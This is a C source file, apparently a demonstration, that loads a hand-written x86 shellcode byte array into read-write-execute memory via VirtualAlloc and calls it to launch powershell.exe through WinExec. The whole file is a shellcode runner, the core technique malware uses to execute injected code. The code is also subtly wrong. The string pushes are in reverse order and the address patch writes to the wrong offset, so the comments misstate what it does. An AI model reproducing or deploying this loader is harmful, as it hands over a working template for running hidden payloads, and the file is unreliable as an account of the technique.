#include <windows.h>
#include <stdio.h>

int main() {

    unsigned char payload[] = {
        0xFC,                               // cld (clear direction flag)
        0x68, 0x70, 0x6F, 0x77, 0x65,       // push "powe"
        0x68, 0x72, 0x73, 0x68, 0x65,       // push "rshe"
        0x68, 0x6C, 0x6C, 0x2E, 0x65,       // push "ll.e"
        0x68, 0x78, 0x65, 0x00, 0x00,       // push "xe\0\0"
        0x8B, 0xC4,                         // mov eax, esp (pointer to "powershell.exe\0")
        0x6A, 0x05,                         // push 5 (SW_SHOW)
        0x50,                               // push eax
        0xB8, 0xAA, 0xAA, 0xAA, 0xAA,       // mov eax, 0xAAAAAAAA (WinExec address - will be filled at runtime)
        0xFF, 0xD0,                         // call eax
        0xC3                                // ret
    };

    // Get the address of WinExec
    HMODULE kernel32 = LoadLibraryA("kernel32.dll");
    if (!kernel32) {
        printf("Failed to load kernel32.dll\n");
        return 1;
    }
    
    FARPROC winExecAddr = GetProcAddress(kernel32, "WinExec");
    if (!winExecAddr) {
        printf("Failed to find WinExec\n");
        FreeLibrary(kernel32);
        return 1;
    }
    
    // Replace the placeholder with actual WinExec address
    *(DWORD*)(payload + 22) = (DWORD)winExecAddr;
    
    // Allocate executable memory
    void *exec = VirtualAlloc(
        NULL,
        sizeof(payload),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!exec) {
        printf("VirtualAlloc failed\n");
        FreeLibrary(kernel32);
        return 1;
    }

    memcpy(exec, payload, sizeof(payload));

    // Execute the shellcode
    void (*func)() = (void (*)())exec;
    func();

    // Cleanup
    FreeLibrary(kernel32);
    VirtualFree(exec, 0, MEM_RELEASE);
    
    printf("PowerShell should have been launched.\n");
    return 0;
}